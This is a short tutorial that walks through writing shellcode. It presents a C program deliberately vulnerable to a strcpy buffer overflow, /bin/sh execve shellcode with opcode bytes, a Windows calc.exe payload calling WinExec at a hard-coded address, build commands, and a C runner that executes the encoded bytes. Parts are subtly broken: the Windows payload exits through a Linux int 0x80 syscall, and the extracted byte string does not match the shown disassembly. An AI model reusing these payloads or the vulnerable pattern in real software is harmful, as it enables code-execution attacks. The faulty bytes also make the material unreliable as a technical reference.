### shellcode?

- a small piece of code used as a payload for exploitation of software.
- written in assembly language and designed to be injected into memory.
- primary use is arbitrary code execution.

#### How does Shellcode work?

a basic program that is vulnerable to a buffer overflow due to not checking
lengths passed.

```c
#include <stdio.h>
#include <string.h>

void no_length_check_function(char *input) {
    char buffer[100]; // add a buffer
    strcpy(buffer, input); // do not check the length of the input and copy
}

// create the 'entrypoint' for the program that takes argc (argument count) and
// argv (argument variables) as the arguments
int main(int argc, char *argv[]) {
    // pass the first argv (argv[1]) which will be the second argument IE:
    // file.exe ARGUMENT1 to the vulnerable function
    no_length_check_function(argv[1]);
    return 0; // return becuase it's an int
}
```

when compiled allows an attacker to control the EIP by passing more than 100 characters as the argument.

a pseudo shellcode to overwrite the EIP with the following:

```asm
xor eax, eax        ;"\x31\xc0"
push eax            ;"\x50"
push "//sh"         ;"\x68\x2f\x2f\x73\x68"
push "/bin"         ;"\x68\x2f\x62\x69\x6e"
mov ebx, esp        ;"\x89\xe3"
push eax            ;"\x50"
push ebx            ;"\x53"
mov ecx, esp        ;"\x89\xe1"
cdq                 ;"\x99"
mov al, 0xb         ;(execve syscall number) ;"\xb0\x0b"
int 0x80            ;(trigger syscall) ;"\xcd\x80"
```

#### Let's write some shellcode!

a basic assembly program to launch calc.exe.

```asm
section .text
    global _start

_start:
    ; push a null terminated string containing 'calc.exe' onto the stack
    xor    eax, eax
    push   eax
    push   0x6578652e  ; "exe."
    push   0x636c6163  ; "calc"
    mov    ebx, esp

    ; get WinExec address from kernel32.dll (typical system might be different for your system)
    mov    eax, 0x76c76360

    push   1
    push   ebx  ; "calc.exe"
    call   eax  ; call WinExec(lpCmdLine="calc.exe", SW_SHOWNORMAL)

    ; exit cleanly
    xor    eax, eax
    push   eax
    mov    al, 0x1
    int    0x80
```

need two things:

1. [NASM](https://www.nasm.us/)
2.[MinGW](https://www.mingw-w64.org/downloads/)

#### Compiling it!

first compile the shellcode into an object (`.o`) file.

1. `nasm -f win32 .\test_calc.asm -o test_calc.o`

2. Link the object file `gcc -m32 -o test_calc.exe .\test_calc.o "-Wl,-e,_start" -nostdlib`

#### Adding shellcode to your attack

```
PS C:\Users\xxx> objdump -d .\test_calc.o

.\test_calc.o:     file format pe-i386


Disassembly of section .text:

00000000 <_start>:
   0:   31 c0                   xor    %eax,%eax
   2:   50                      push   %eax
   3:   68 2e 65 78 65          push   $0x6578652e
   8:   68 63 61 6c 63          push   $0x636c6163
   d:   89 e3                   mov    %esp,%ebx
   f:   b8 60 63 c7 76          mov    $0x76c76360,%eax
  14:   6a 01                   push   $0x1
  16:   53                      push   %ebx
  17:   ff d0                   call   *%eax
  19:   31 c0                   xor    %eax,%eax
  1b:   50                      push   %eax
  1c:   b0 01                   mov    $0x1,%al
  1e:   cd 80                   int    $0x80
```

convert the above to the correct format by copying the opcodes and
converting them into the `\xnn` format like so:

```
\x31\xc0\x50\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\xb8\x60\x63\xc7\x76\x6a\x01\x53\xff\xd0\x31\xc0\x50\xb0\x01\xb0\x01\xcd\x80
```

```c
unsigned char code[] = "\x31\xc0\x50\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\xb8\x60\x63\xc7\x76\x6a\x01\x53\xff\xd0\x31\xc0\x50\xb0\x01\xb0\x01\xcd\x80";

int main (void) {
    (*(void(*)()) code)();
}
```

C code calls the `unsigned char` variable as a function and runs it directly i.e. `(*(void(*)()) code)();` is
a type cast to treat the code as a function pointer without any arguments.
